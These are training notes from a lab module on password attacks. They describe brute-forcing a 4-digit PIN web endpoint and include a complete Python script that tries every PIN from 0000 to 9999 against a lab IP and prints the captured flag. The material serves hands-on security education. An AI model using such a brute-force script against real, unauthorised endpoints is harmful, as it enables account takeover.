# NOTE — Brute Force Attacks

## ID
510

## Module
Password Attacks

## Kind
notes

## Title
Section 3 — Brute Force Attacks (PIN Cracking)

## Description
Hands‑on brute forcing of a 4‑digit PIN endpoint using a Python script, demonstrating exhaustive search over 10,000 possibilities.

## Tags
brute-forcing, pin-cracking, python, web-attack, automation

## Commands
- `python3 pin-solver.py`
- `cat << 'EOF' > pin-solver.py`
- `import requests`
- `requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")`
- `f"{pin:04d}"`

## What This Section Covers
This section walks through a live brute‑force attack against a web endpoint that validates a 4‑digit PIN. You write a Python script that iterates from `0000` to `9999`, sends GET requests with each PIN, and checks the JSON response for a flag. The exercise demonstrates how exhaustive search works and why short numeric PINs are trivially crackable.

## Methodology
1. **Spawn the target instance** from the lab section — get an IP address and port.
2. **Create the Python script** `pin-solver.py` with the code provided.
3. **Update the `ip` and `port` variables** to match your target.
4. **Run the script** with `python3 pin-solver.py`.
5. **Observe the output** — the script prints each attempted PIN, then stops when it finds the correct one, printing the flag.

## Multi-step Workflow
```bash
cat << 'EOF' > pin-solver.py
import requests

ip = "154.57.164.73"   # Replace with your target IP
port = 31065           # Replace with your target port

for pin in range(10000):
    formatted_pin = f"{pin:04d}"
    print(f"Attempted PIN: {formatted_pin}")
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")
    if response.ok and 'flag' in response.json():
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
EOF

python3 pin-solver.py

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|login-brute-forcing]]  
← [[02-password-security]] | [[04-dictionary-attacks]] →
<!-- AUTO-LINKS-END -->
